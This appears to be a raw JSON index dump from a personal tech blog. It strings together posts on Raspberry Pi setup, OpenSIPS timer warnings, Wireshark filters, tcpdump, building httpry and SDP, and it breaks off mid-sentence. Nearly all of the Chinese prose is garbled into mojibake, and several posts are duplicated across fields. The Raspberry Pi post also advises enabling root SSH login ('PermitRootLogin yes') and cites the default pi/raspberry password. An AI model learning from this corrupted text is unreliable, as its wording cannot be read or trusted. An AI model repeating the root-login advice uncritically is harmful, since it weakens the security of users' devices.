ä½¿ç”¨wifiè¿æ¥ï¼Œä¸€ç§æ–¹å¼æ˜¯ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªæ¯”è¾ƒéº»çƒ¦ã€‚æˆ‘å»ºè®®ä½¿ç”¨æ ‘è“æ´¾æä¾›çš„raspi-configå‘½ä»¤æ¥è®¾ç½®wifiã€‚\nåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼šraspi-config, å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢\næŒ‰ä¸‹ç®­å¤´ï¼Œé€‰æ‹©NetWork Optionsï¼ŒæŒ‰å›è½¦ç¡®è®¤ è¿›å…¥ç½‘ç»œè®¾ç½®åï¼ŒæŒ‰ä¸‹ç®­å¤´ï¼Œé€‰æ‹©N2 Wi-fi ç„¶åå°±å¾ˆç®€å•äº†ï¼Œè¾“å…¥wifiåç§°å’Œwifiå¯†ç ï¼Œæœ€å¥½ä½ çš„wifiåç§°æ˜¯è‹±æ–‡çš„ï¼Œå‡ºç°ä¸­æ–‡ä¼šå¾ˆå°´å°¬çš„ã€‚ 6. å¦‚ä½•æ‰¾åˆ°æ ‘è“æ´¾çš„IPåœ°å€ æŸäº›æƒ…å†µä¸‹ï¼Œæ ‘è“æ´¾åœ¨æ–­ç”µé‡å¯ä¹‹åä¼šè·å¾—æ–°çš„IPåœ°å€ã€‚åœ¨æ²¡æœ‰æ˜¾ç¤ºå™¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ‰¾åˆ°æ ‘è“æ´¾çš„IPå‘¢ï¼Ÿ\næ ‘è“æ´¾çš„MACåœ°å€æ˜¯ï¼šb8:27:eb:6c å¼€å¤´\næ‰€ä»¥ä½ åªéœ€è¦è¾“å…¥: arp -a å°±ä¼šæ‰“å°ç½‘ç»œä¸­çš„ä¸»æœºä»¥åŠMACåœ°å€ï¼Œæ‰¾ä»¥b8:e7:eb:6cå¼€å¤´çš„ï¼Œå¾ˆå¯èƒ½å°±æ˜¯æ ‘è“æ´¾ã€‚\n7. è®¾ç½®æ¸…åé•œåƒæº https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/\n","permalink":"https://wdd.js.org/posts/2022/10/raspi-config/","summary":"æˆ‘å·²ç»è£…è¿‡å‡ æ¬¡æ ‘è“æ´¾çš„ç³»ç»Ÿäº†ï¼Œè®°å½•ä¸€äº›ä½¿ç”¨å¿ƒå¾—ã€‚\n1. é€‰æ‹©å“ªä¸ªç‰ˆæœ¬ æœ€å¥½ç”¨æ— æ¡Œé¢ç‰ˆï¼Œæ— æ¡Œé¢ç‰ˆæ›´åŠ ç¨³å®šã€‚æˆ‘ä¹‹å‰ç”¨è¿‡å‡ æ¬¡æ¡Œé¢ç‰ˆï¼Œæ¡Œé¢ç‰ˆå­˜åœ¨ä»¥ä¸‹é—®é¢˜ã€‚\nä½¿ç”¨å¶å°”æ„Ÿè§‰ä¼šå¡ ç»å¸¸ä½¿ç”¨ä¸€å¤©ä¹‹åï¼Œç¬¬äºŒå¤©è¦é‡å¯ç³»ç»Ÿã€‚ 2. å…³äºåˆå§‹è®¾ç½® é»˜è®¤çš„ç”¨æˆ·æ˜¯ piï¼Œé»˜è®¤çš„å¯†ç æ˜¯raspberry ç™»å½•æˆåŠŸä¹‹åï¼Œsudo passwd pi æ¥ä¿®æ”¹piç”¨æˆ·çš„å¯†ç  ç™»å½•ä¹‹åï¼Œsudo passwd root æ¥è®¾ç½®rootçš„ç”¨æˆ·å¯†ç  3. å¼€å¯ssh è¿œç¨‹ç™»å½•æœåŠ¡ raspi-config 4. rootç”¨æˆ·sshç™»å½• é»˜è®¤æ ‘è“æ´¾æ˜¯ç¦æ­¢ä½¿ç”¨rootè¿œç¨‹ç™»å½•çš„ï¼Œæƒ³è¦å¼€å¯çš„è¯ï¼Œéœ€è¦ç¼–è¾‘/etc/ssh/sshd_configæ–‡ä»¶ï¼Œå¢åŠ ä¸€è¡ŒPermitRootLogin yes, ç„¶åé‡å¯sshæœåŠ¡\nvi /etc/ssh/sshd_config PermitRootLogin yes sudo systemctl restart ssh // chong 5. å…³äºè”ç½‘ è”ç½‘æœ‰ä¸¤ä¸ªæ–¹æ¡ˆ\nç”¨ç½‘çº¿è¿æ¥ï¼Œç®€å•æ–¹ä¾¿ï¼Œä½†æ˜¯æœ‰æ¡çº¿å­ï¼Œæ€»ä¼šæŠŠæ¡Œé¢æå¾—å¾ˆä¹± ä½¿ç”¨wifiè¿æ¥ï¼Œç®€å•æ–¹ä¾¿ ä½¿ç”¨wifiè¿æ¥ï¼Œä¸€ç§æ–¹å¼æ˜¯ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªæ¯”è¾ƒéº»çƒ¦ã€‚æˆ‘å»ºè®®ä½¿ç”¨æ ‘è“æ´¾æä¾›çš„raspi-configå‘½ä»¤æ¥è®¾ç½®wifiã€‚\nåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼šraspi-config, å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢\næŒ‰ä¸‹ç®­å¤´ï¼Œé€‰æ‹©NetWork Optionsï¼ŒæŒ‰å›è½¦ç¡®è®¤ è¿›å…¥ç½‘ç»œè®¾ç½®åï¼ŒæŒ‰ä¸‹ç®­å¤´ï¼Œé€‰æ‹©N2 Wi-fi ç„¶åå°±å¾ˆç®€å•äº†ï¼Œè¾“å…¥wifiåç§°å’Œwifiå¯†ç ï¼Œæœ€å¥½ä½ çš„wifiåç§°æ˜¯è‹±æ–‡çš„ï¼Œå‡ºç°ä¸­æ–‡ä¼šå¾ˆå°´å°¬çš„ã€‚ 6. å¦‚ä½•æ‰¾åˆ°æ ‘è“æ´¾çš„IPåœ°å€ æŸäº›æƒ…å†µä¸‹ï¼Œæ ‘è“æ´¾åœ¨æ–­ç”µé‡å¯ä¹‹åä¼šè·å¾—æ–°çš„IPåœ°å€ã€‚åœ¨æ²¡æœ‰æ˜¾ç¤ºå™¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ‰¾åˆ°æ ‘è“æ´¾çš„IPå‘¢ï¼Ÿ\næ ‘è“æ´¾çš„MACåœ°å€æ˜¯ï¼šb8:27:eb:6c å¼€å¤´\næ‰€ä»¥ä½ åªéœ€è¦è¾“å…¥: arp -a å°±ä¼šæ‰“å°ç½‘ç»œä¸­çš„ä¸»æœºä»¥åŠMACåœ°å€ï¼Œæ‰¾ä»¥b8:e7:eb:6cå¼€å¤´çš„ï¼Œå¾ˆå¯èƒ½å°±æ˜¯æ ‘è“æ´¾ã€‚\n7. è®¾ç½®æ¸…åé•œåƒæº https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/","title":"æ ‘è“æ´¾åˆå§‹åŒ–é…ç½®"},{"content":" å¯èƒ½å’Œavp_db_queryæœ‰å…³ https://opensips.org/pipermail/users/2018-October/040157.html What we found is that the warning go away if we comment out the single avp_db_query that is being used in our config.\n_ The avp_db_query is not executed at the start, but only when specific header is present. Yet the fooding start immediately after opensips start. The mere presence of the avp_db_query function in config without execution is enough to have the issue._\nå¯èƒ½å’Œopensslåº“æœ‰å…³ https://github.com/OpenSIPS/opensips/issues/1771#issuecomment-517744489 ere are your results. I\u0026rsquo;m attaching the full backtrace (looks about the same) and the logs containing the memory debug. Please let me know if you need additional info.\nè¿™ä¸ªè®¨è®ºå¾ˆæœ‰ä»·å€¼ æ„Ÿè§‰å’Œcurlè¶…æ—¶æœ‰å…³ https://github.com/OpenSIPS/opensips/issues/929 I checked with a tcpdump, and that http request was answered after 40ms, but opensips missed it. Another strange thing is that despite of the use of async, opensips does not process any other SIP request while waiting for this missing answer, I see because with default params, with 20s timeout, opensips didn\u0026rsquo;t process REGISTER request and SIP endpoints unregistered, this is the reason because I changed connection timeout to 1s.\nI\u0026rsquo;ve discovered that this issue occured only if http keepalive (tcp persistent connection) is enabled. I\u0026rsquo;ve simply added \u0026ldquo;KeepAlive Off\u0026rdquo; directive in httpd configuration and the problem stopped.\nI hope this info will be useful for debugging.\nä½¿ç”¨opensipsctl trap å¯ä»¥äº§ç”Ÿè°ƒç”¨æ ˆæ–‡ä»¶ WARNING:core:utimer_ticker: utimer task already scheduled for 8723371990 ms (now 8723387850 ms), it may overlap.\nå‚è€ƒèµ„æ–™ https://github.com/OpenSIPS/opensips/issues/1767 https://opensips.org/pipermail/users/2018-October/040151.html https://github.com/OpenSIPS/opensips/issues/2183 https://github.com/OpenSIPS/opensips/issues/1858 https://opensips.org/pipermail/users/2019-August/041454.html https://opensips.org/pipermail/users/2017-October/038209.html ","permalink":"https://wdd.js.org/opensips/ch1/utime-task-scheduled/","summary":"å¯èƒ½å’Œavp_db_queryæœ‰å…³ https://opensips.org/pipermail/users/2018-October/040157.html What we found is that the warning go away if we comment out the single avp_db_query that is being used in our config.\n_ The avp_db_query is not executed at the start, but only when specific header is present. Yet the fooding start immediately after opensips start. The mere presence of the avp_db_query function in config without execution is enough to have the issue._\nå¯èƒ½å’Œopensslåº“æœ‰å…³ https://github.com/OpenSIPS/opensips/issues/1771#issuecomment-517744489 ere are your results.","title":"utimer task \u003ctm-utimer\u003e already scheduled"},{"content":"1. HTTPæŠ“åŒ…ä¾‹å­ æ¡ˆä¾‹ï¼šæœ¬åœ°å‘ http://192.168.40.134:31204/some-apiï¼Œå¦‚ä½•è¿‡æ»¤ï¼Ÿ\nhttp and ip.addr == 192.168.40.134 and tcp.port == 31204 è¯­å¥åˆ†æï¼š\nhttp è¡¨ç¤ºæˆ‘åªéœ€è¦httpçš„åŒ… ip.addr è¡¨ç¤ºåªè¦æºipæˆ–è€…ç›®æ ‡ipåœ°å€ä¸­åŒ…å«192.168.40.134 tcp.port è¡¨ç¤ºåªè¦æºç«¯å£æˆ–è€…ç›®æ ‡ç«¯å£ä¸­åŒ…å«31204 2. ä¸ºä»€ä¹ˆæˆ‘å†™çš„è¡¨è¾¾å¼æ€»æ˜¯ä¸å¯¹å‘¢ï¼ŸğŸ˜‚ å¾ˆå¤šæ—¶å€™ï¼Œä½ å†™çš„è¡¨è¾¾å¼èƒŒæ™¯è‰²å˜æˆçº¢è‰²ï¼Œè¯´æ˜è¡¨è¾¾å¼é”™è¯¯äº†ï¼Œä¾‹å¦‚ä¸‹å›¾ï¼šhttp and ip.port == 31204\nå†™å‡ºip.portè¿™ä¸ªè¯­å¥ï¼Œå¾€å¾€æ˜¯å¯¹ä¼ è¾“åè®®ç†è§£ä¸æ¸…æ™°ã€‚ğŸ˜…\nipæ˜¯ç½‘ç»œå±‚çš„åè®®ï¼Œportæ˜¯ä¼ è¾“å±‚tcpæˆ–è€…udpä¸­ä½¿ç”¨çš„ã€‚ä¾‹å¦‚ä½ å†™tcp.port == 80ï¼Œudp.port ==3000è¿™æ ·æ˜¯æ²¡é—®é¢˜çš„ã€‚ä½†æ˜¯portä¸èƒ½è·Ÿåœ¨ipçš„åé¢ï¼Œå¦‚æœä½ ä¸æ¸…æ¥šæ€ä¹ˆå†™ï¼Œä½ å¯ä»¥é€‰æ‹©wiresharkçš„æ™ºèƒ½æç¤ºã€‚\næ™ºèƒ½æç¤ºä¼šæç¤ºæ‰€æœ‰å¯ç”¨çš„è¡¨è¾¾å¼ã€‚\n3. å¸¸ç”¨è¿‡æ»¤è¡¨è¾¾å¼ ä¸€èˆ¬æˆ‘ä»¬çš„è¿‡æ»¤éƒ½æ˜¯åŸºäºåè®®ï¼Œipåœ°å€æˆ–è€…ç«¯å£å·è¿›è¡Œè¿‡æ»¤çš„ï¼Œ\n3.1. åŸºäºåè®®çš„è¿‡æ»¤ ç›´æ¥è¾“å…¥åè®®åè¿›è¡Œè¿‡æ»¤\n3.2. åŸºäºIPåœ°å€çš„è¿‡æ»¤ 3.3. åŸºäºç«¯å£çš„è¿‡æ»¤ åŸºäºç«¯å£çš„è¿‡æ»¤ä¸€èˆ¬å°±ä¸¤ç§\ntcp.port == xxx udp.port == xxx 3.4. åŸºäºhostçš„è¿‡æ»¤ 4. æ¯”è¾ƒè¿ç®—ç¬¦æ”¯æŒ == ç­‰äº != ä¸ç­‰äº \u0026gt; å¤§äº \u0026lt; å°äº \u0026gt;= å¤§äºç­‰äº \u0026lt;= å°äºç­‰äº ip.addr == 192.168.2.4 5. é€»è¾‘è¿ç®—ç¬¦ and æ¡ä»¶ä¸ or æ¡ä»¶æˆ– xor ä»…èƒ½æœ‰ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸ not æ‰€æœ‰æ¡ä»¶éƒ½ä¸èƒ½ä¸ºçœŸ ip.addr == 192.168.2.4 and tcp.port == 2145 and !tcp.port == 3389 6. åªå…³å¿ƒæŸäº›ç‰¹æ®Šçš„tcpåŒ… tcp.flags.fin==1 åªè¿‡æ»¤å…³é—­è¿æ¥çš„åŒ… tcp.flags.syn==1\tåªè¿‡æ»¤å»ºç«‹è¿æ¥çš„åŒ… tcp.flags.reset==1 åªè¿‡æ»¤å‡ºtcpè¿æ¥é‡ç½®çš„åŒ… 7. ç»Ÿè®¡æ¨¡å— 7.1. æŸ¥çœ‹æœ‰å“ªäº›IP Statistics -\u0026gt; endpoints\n7.2. æŸ¥çœ‹é‚£äº›IPä¹‹é—´å‘ç”Ÿä¼šè¯ Statistics -\u0026gt; Conversations\n7.3. æŒ‰ç…§åè®®åˆ’åˆ† 8. æœ€å åœ¨ä¼šä½¿ç”¨ä¸Šè¿°å››ä¸ªè¿‡æ»¤æ–¹å¼ä¹‹åï¼Œå°±å¯ä»¥è‡ªç”±çš„æ‰©å±•äº†\nğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ğŸ„ â›¹ï¸â€â™€ï¸â›¹ï¸â€â™€ï¸â›¹ï¸â€â™€ï¸â›¹ï¸â€â™€ï¸â›¹ï¸â€â™€ï¸â›¹ï¸â€â™€ï¸ ğŸ‹ï¸ğŸ‹ï¸ğŸ‹ï¸ğŸ‹ï¸ğŸ‹ï¸ğŸ‹ï¸\nhttp.request.method == GET # åŸºäºhttpè¯·æ±‚æ–¹å¼çš„è¿‡æ»¤ ip.src == 192.168.1.4 ","permalink":"https://wdd.js.org/network/wireshark/","summary":"1. HTTPæŠ“åŒ…ä¾‹å­ æ¡ˆä¾‹ï¼šæœ¬åœ°å‘ http://192.168.40.134:31204/some-apiï¼Œå¦‚ä½•è¿‡æ»¤ï¼Ÿ\nhttp and ip.addr == 192.168.40.134 and tcp.port == 31204 è¯­å¥åˆ†æï¼š\nhttp è¡¨ç¤ºæˆ‘åªéœ€è¦httpçš„åŒ… ip.addr è¡¨ç¤ºåªè¦æºipæˆ–è€…ç›®æ ‡ipåœ°å€ä¸­åŒ…å«192.168.40.134 tcp.port è¡¨ç¤ºåªè¦æºç«¯å£æˆ–è€…ç›®æ ‡ç«¯å£ä¸­åŒ…å«31204 2. ä¸ºä»€ä¹ˆæˆ‘å†™çš„è¡¨è¾¾å¼æ€»æ˜¯ä¸å¯¹å‘¢ï¼ŸğŸ˜‚ å¾ˆå¤šæ—¶å€™ï¼Œä½ å†™çš„è¡¨è¾¾å¼èƒŒæ™¯è‰²å˜æˆçº¢è‰²ï¼Œè¯´æ˜è¡¨è¾¾å¼é”™è¯¯äº†ï¼Œä¾‹å¦‚ä¸‹å›¾ï¼šhttp and ip.port == 31204\nå†™å‡ºip.portè¿™ä¸ªè¯­å¥ï¼Œå¾€å¾€æ˜¯å¯¹ä¼ è¾“åè®®ç†è§£ä¸æ¸…æ™°ã€‚ğŸ˜…\nipæ˜¯ç½‘ç»œå±‚çš„åè®®ï¼Œportæ˜¯ä¼ è¾“å±‚tcpæˆ–è€…udpä¸­ä½¿ç”¨çš„ã€‚ä¾‹å¦‚ä½ å†™tcp.port == 80ï¼Œudp.port ==3000è¿™æ ·æ˜¯æ²¡é—®é¢˜çš„ã€‚ä½†æ˜¯portä¸èƒ½è·Ÿåœ¨ipçš„åé¢ï¼Œå¦‚æœä½ ä¸æ¸…æ¥šæ€ä¹ˆå†™ï¼Œä½ å¯ä»¥é€‰æ‹©wiresharkçš„æ™ºèƒ½æç¤ºã€‚\næ™ºèƒ½æç¤ºä¼šæç¤ºæ‰€æœ‰å¯ç”¨çš„è¡¨è¾¾å¼ã€‚\n3. å¸¸ç”¨è¿‡æ»¤è¡¨è¾¾å¼ ä¸€èˆ¬æˆ‘ä»¬çš„è¿‡æ»¤éƒ½æ˜¯åŸºäºåè®®ï¼Œipåœ°å€æˆ–è€…ç«¯å£å·è¿›è¡Œè¿‡æ»¤çš„ï¼Œ\n3.1. åŸºäºåè®®çš„è¿‡æ»¤ ç›´æ¥è¾“å…¥åè®®åè¿›è¡Œè¿‡æ»¤\n3.2. åŸºäºIPåœ°å€çš„è¿‡æ»¤ 3.3. åŸºäºç«¯å£çš„è¿‡æ»¤ åŸºäºç«¯å£çš„è¿‡æ»¤ä¸€èˆ¬å°±ä¸¤ç§\ntcp.port == xxx udp.port == xxx 3.4. åŸºäºhostçš„è¿‡æ»¤ 4. æ¯”è¾ƒè¿ç®—ç¬¦æ”¯æŒ == ç­‰äº != ä¸ç­‰äº \u0026gt; å¤§äº \u0026lt; å°äº \u0026gt;= å¤§äºç­‰äº \u0026lt;= å°äºç­‰äº ip.addr == 192.168.2.4 5. é€»è¾‘è¿ç®—ç¬¦ and æ¡ä»¶ä¸ or æ¡ä»¶æˆ– xor ä»…èƒ½æœ‰ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸ not æ‰€æœ‰æ¡ä»¶éƒ½ä¸èƒ½ä¸ºçœŸ ip.","title":"WiresharkæŠ“åŒ…æ•™ç¨‹"},{"content":"æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ ä»å¸®åŠ©æ–‡æ¡£å¯ä»¥çœ‹å‡ºï¼ŒåŒ…è¿‡æ»¤çš„è¡¨è¾¾å¼ä¸€å®šè¦æ”¾åœ¨æœ€åä¸€ä¸ªå‚æ•°\ntcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ] [ -c count ] [ --count ] [ -C file_size ] [ -E spi@ipaddr algo:secret,... ] [ -F file ] [ -G rotate_seconds ] [ -i interface ] [ --immediate-mode ] [ -j tstamp_type ] [ -m module ] [ -M secret ] [ --number ] [ --print ] [ -Q in|out|inout ] [ -r file ] [ -s snaplen ] [ -T type ] [ --version ] [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ] [ -Z user ] [ --time-stamp-precision=tstamp_precision ] [ --micro ] [ --nano ] [ expression ] åˆ—å‡ºæ‰€æœ‰ç½‘å¡ tcpdump -D 1.enp89s0 [Up, Running, Connected] 2.docker0 [Up, Running, Connected] 3.vetha051ecc [Up, Running, Connected] 4.vethe67e03a [Up, Running, Connected] 5.vethc58c174 [Up, Running, Connected] æŒ‡å®šç½‘å¡ -i tcpdump -i eth0 æ‰€æœ‰ç½‘å¡ tcpdump -i any ä¸è¦åŸŸåè§£æ tcpdump -n -i any æŒ‡å®šä¸»æœº tcpdoump host 192.168.0.1 æŒ‡å®šæºIPæˆ–è€…ç›®æ ‡IP # æ ¹æ®æºIPè¿‡æ»¤ tcpdump src 192.168.3.2 # æ ¹æ®ç›®æ ‡IPè¿‡æ»¤ tcpdump dst 192.168.3.2 æŒ‡å®šåè®®è¿‡æ»¤ tcpdump tcp æŒ‡å®šç«¯å£ # æ ¹æ®æŸä¸ªç«¯å£è¿‡æ»¤ tcpdomp port 33 # æ ¹æ®æºç«¯å£æˆ–è€…ç›®æ ‡ç«¯å£è¿‡æ»¤ tcpdump dst port 33 tcpdump src port 33 # æ ¹æ®ç«¯å£èŒƒå›´è¿‡æ»¤ tcpdump portrange 30-90 æ ¹æ®IPå’Œåœ°å€ tcpdump -i ens33 tcp and host 192.168.40.30 æŠ“åŒ…ç»“æœå†™æ–‡ä»¶ tcpdump -i ens33 tcp and host 192.168.40.30 -w log.pcap æ¯éš”30ç§’å†™ä¸€ä¸ªæ–‡ä»¶ -G 30Â è¡¨ç¤ºæ¯éš”30ç§’å†™ä¸€ä¸ªæ–‡ä»¶ æ–‡ä»¶åä¸­çš„%å®é™…ä¸Šæ˜¯æ—¶é—´æ ¼å¼ tcpdump -i ens33 -G 30 tcp and host 192.168.40.30 -w %Y_%m%d_%H%M_%S.log.pcap æ¯è¾¾åˆ°30MBäº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ -C 30Â æ¯è¾¾åˆ°30MBäº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ tcpdump -i ens33 -C 30 tcp and host 192.168.40.30 -w log.pcap æŒ‡å®šæŠ“åŒ…çš„ä¸ªæ•° åœ¨æµé‡å¾ˆå¤§çš„ç½‘ç»œä¸ŠæŠ“åŒ…ï¼Œå¦‚æœå†™æ–‡ä»¶çš„è¯ï¼Œå¾ˆå¯èƒ½å°†ç£ç›˜å†™æ»¡ã€‚æ‰€ä»¥æœ€å¥½æŒ‡å®šä¸€ä¸ªæœ€å¤§çš„æŠ“åŒ…ä¸ªæ•°ï¼Œåœ¨è¾¾åˆ°åŒ…çš„ä¸ªæ•°åï¼Œè‡ªåŠ¨é€€å‡ºã€‚\ntcpdump -c 100000 -i eth0 host 21.23.3.2 -w test.pcap æŠ“åŒ…æ–‡ä»¶å¤ªå¤§ï¼Œåˆ‡å‰²æˆå°åŒ… æŠŠåŸæ¥çš„åŒ…æ–‡ä»¶åˆ‡å‰²æˆ20Må¤§å°çš„å¤šä¸ªåŒ…\ntcpdump -r old_file -w new_files -C 20 æŒ‰ç…§åŒ…é•¿å¤§å°è¿‡æ»¤ # åŒ…é•¿å°äºæŸä¸ªå€¼ tcpdump less 30 # åŒ…é•¿å¤§äºæŸä¸ªå€¼ tcpdump greater 30 æŒ‰ç…§16è¿›åˆ¶çš„æ–¹å¼æ˜¾ç¤ºåŒ…çš„å†…å®¹ BPF è¿‡æ»¤è§„åˆ™ port 53 src port 53 dest port 53 host 1.2.3.4 src host 1.2.3.4 dest host 1.2.3.4 host 1.2.3.4 and port 53 è¯»å–old.pcapæ–‡ä»¶ ç„¶åæ ¹æ®æ¡ä»¶è¿‡æ»¤ äº§ç”Ÿæ–°çš„æ–‡ä»¶ é€‚ç”¨äºä»ä¸€ä¸ªå¤§çš„pcapæ–‡ä»¶ä¸­è¿‡æ»¤å‡ºéœ€è¦çš„åŒ…\ntcpdump -r old.pcap -w new.pcap less 1280 æœ€ä½³å®è·µ 1. å…³æ³¨ packets dropped by kernelçš„å€¼ æœ‰æ—¶å€™ï¼ŒæŠ“åŒ…åœæ­¢åï¼Œtcpdumpæ‰“å°xxxä¸ªåŒ…drop by kernelã€‚ä¸€æ—¦è¿™ä¸ªå€¼ä¸ä¸ºé›¶ï¼Œå°±è¦æ³¨æ„äº†ã€‚æŸäº›åŒ…å¹¶ä¸æ˜¯åœ¨ç½‘ç»œä¸­ä¸¢åŒ…äº†ï¼Œè€Œæ˜¯åœ¨tcpdumpè¿™ä¸ªå·¥å…·ç»™ä¸¢å¼ƒäº†ã€‚\n60 packets captured 279514 packets received by filter 279368 packets dropped by kernel é»˜è®¤æƒ…å†µä¸‹ï¼ŒtcpdumpæŠ“åŒ…æ—¶ä¼šåšdnsè§£æï¼Œè¿™ä¸ªdnsè§£æä¼šé™ä½tcpdumpçš„å¤„ç†é€Ÿåº¦ï¼Œé€ æˆtcpdumpçš„bufferè¢«å¡«æ»¡ï¼Œç„¶åå°±è¢«tcpdumpä¸¢å¼ƒã€‚\næˆ‘ä»¬å¯ä»¥ç”¨ä¸¤ä¸ªæ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜\n-B æŒ‡å®šbufferçš„å¤§å°ï¼Œé»˜è®¤å•ä½ä¸ºkbã€‚ä¾‹å¦‚-B 1024 -n -nn è®¾ç½®tcpdump ä¸è¦è§£æhoståœ°å€ï¼Œä¸è¦æŠ“æ¢åè®®å’Œç«¯å£å· -n Don\u0026#39;t convert host addresses to names. This can be used to avoid DNS lookups. -nn Don\u0026#39;t convert protocol and port numbers etc. to names either. -B buffer_size --buffer-size=buffer_size Set the operating system capture buffer size to buffer_size, in units of KiB (1024 bytes). å‚è€ƒ https://serverfault.com/questions/131872/how-to-split-a-pcap-file-into-a-set-of-smaller-ones http://alumni.cs.ucr.edu/~marios/ethereal-tcpdump.pdf ethereal-tcpdump.pdf https://unix.stackexchange.com/questions/144794/why-would-the-kernel-drop-packets ","permalink":"https://wdd.js.org/network/tcpdump/","summary":"æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ ä»å¸®åŠ©æ–‡æ¡£å¯ä»¥çœ‹å‡ºï¼ŒåŒ…è¿‡æ»¤çš„è¡¨è¾¾å¼ä¸€å®šè¦æ”¾åœ¨æœ€åä¸€ä¸ªå‚æ•°\ntcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ] [ -c count ] [ --count ] [ -C file_size ] [ -E spi@ipaddr algo:secret,... ] [ -F file ] [ -G rotate_seconds ] [ -i interface ] [ --immediate-mode ] [ -j tstamp_type ] [ -m module ] [ -M secret ] [ --number ] [ --print ] [ -Q in|out|inout ] [ -r file ] [ -s snaplen ] [ -T type ] [ --version ] [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ] [ -Z user ] [ --time-stamp-precision=tstamp_precision ] [ --micro ] [ --nano ] [ expression ] åˆ—å‡ºæ‰€æœ‰ç½‘å¡ tcpdump -D 1.","title":"TcpdumpæŠ“åŒ…æ•™ç¨‹"},{"content":"git clone https://gitee.com/nuannuande/httpry.git cd httpry yum install libpcap-devel -y make make install cp -f httpry /usr/sbin/ httpry -i eth0 ","permalink":"https://wdd.js.org/network/httpry/","summary":"git clone https://gitee.com/nuannuande/httpry.git cd httpry yum install libpcap-devel -y make make install cp -f httpry /usr/sbin/ httpry -i eth0 ","title":"httpæŠ“åŒ…å·¥å…·httpryä½¿ç”¨"},{"content":"1. ä»€ä¹ˆæ˜¯SDP? SDPæ˜¯Session Description Protocolçš„ç¼©å†™ï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯ä¼šè¯æè¿°åè®®ï¼Œè¿™ä¸ªåè®®é€šå¸¸å­˜å‚¨å„ç§å’Œåª’ä½“ç›¸å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ”¯æŒå“ªäº›åª’ä½“ç¼–ç , åª’ä½“ç«¯å£æ˜¯å¤šå°‘ï¼Ÿåª’ä½“IPåœ°å€æ˜¯å¤šå°‘ä¹‹ç±»çš„ã€‚\nSDPä¸€èˆ¬ä½œä¸ºSIPæ¶ˆæ¯çš„bodyéƒ¨åˆ†ã€‚å¦‚ä¸‹æ‰€ç¤º\nINVITE sip:bob@biloxi.example.com SIP/2.0 Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74bf9 Max-Forwards: 70 From: Alice \u0026lt;sip:alice@atlanta.example.com\u0026gt;;tag=9fxced76sl To: Bob \u0026lt;sip:bob@biloxi.example.com\u0026gt; Call-ID: 3848276298220188511@atlanta.example.com CSeq: 1 INVITE Contact: \u0026lt;sip:alice@client.atlanta.example.com;transport=tcp\u0026gt; Content-Type: application/sdp Content-Length: 151 v=0 o=alice 2890844526 2890844526 IN IP4 client.atlanta.example.com s=- c=IN IP4 192.0.2.101 t=0 0 m=audio 49172 RTP/AVP 0 a=rtpmap:0 PCMU/8000 åˆšå¼€å§‹æˆ‘ä¸€ç›´è®¤ä¸ºæŸäº›sipæ¶ˆæ¯ä¸€å®šå¸¦æœ‰sdpï¼Œä¾‹å¦‚inviteæ¶ˆæ¯ã€‚æŸäº›sipè¯·æ±‚ä¸€å®šæ²¡æœ‰æºå¸¦sdpã€‚\nå®é™…ä¸Šsipæ¶ˆæ¯å’Œsdpå¹¶æ²¡æœ‰ç¡¬æ€§çš„é™„å±å…³ç³»ã€‚sipæ˜¯ç”¨æ¥ä¼ è¾“ä¿¡ä»¤çš„ï¼Œsdpæ˜¯ç”¨æ¥æè¿°åª’ä½“æµä¿¡æ¯çš„ã€‚\nå¦‚æœä¿¡ä»¤ä¸éœ€è¦æºå¸¦åª’ä½“æµä¿¡æ¯ï¼Œå°±å¯ä»¥ä¸ç”¨æºå¸¦sdpã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œinviteè¯·æ±‚éƒ½ä¼šå¸¦æœ‰sdpä¿¡æ¯ï¼Œä½†æ˜¯æŸäº›æ—¶å€™ä¹Ÿä¼šæ²¡æœ‰ã€‚ä¾‹å¦‚3PCC(third party call control), ç¬¬ä¸‰æ–¹å‘¼å«æ§åˆ¶ï¼Œæ˜¯æŒ‡ç”±ç¬¬ä¸‰æ–¹è´Ÿè´£åå•†åª’ä½“ä¿¡æ¯ã€‚\nå¸¸è§çš„ä¸€ä¸ªåœºæ™¯\n2. SDPå­—æ®µä»‹ç» 2.1. v= ç‰ˆæœ¬å· å½“å‰sdpçš„ç‰ˆæœ¬å·æ˜¯0ï¼Œæ‰€ä»¥å¸¸è§çš„éƒ½æ˜¯v=0\n2.2. o= å‘èµ·è€…id o=çš„æ ¼å¼\no=username session-id version network-type address-type address usernameï¼š ç™»å½•çš„ç”¨æˆ·åæˆ–è€…ä¸»æœºhost session-id: NTPæ—¶é—´æˆ³ version: NTPæ—¶é—´æˆ³ network-typeï¼š ä¸€èˆ¬æ˜¯IN, è¡¨ç¤ºinternet address-type: è¡¨ç¤ºåœ°å€ç±»å‹ï¼Œå¯ä»¥æ˜¯IP4ï¼Œ IP6 2.3. c= è¿æ¥æ•°æ® c=çš„æ ¼å¼\nc=network-type address-type connection-address network-type: ä¸€èˆ¬æ˜¯IN, è¡¨ç¤ºinternet address-type: åœ°å€ç±»å‹ IP4, IP6 connection-address: 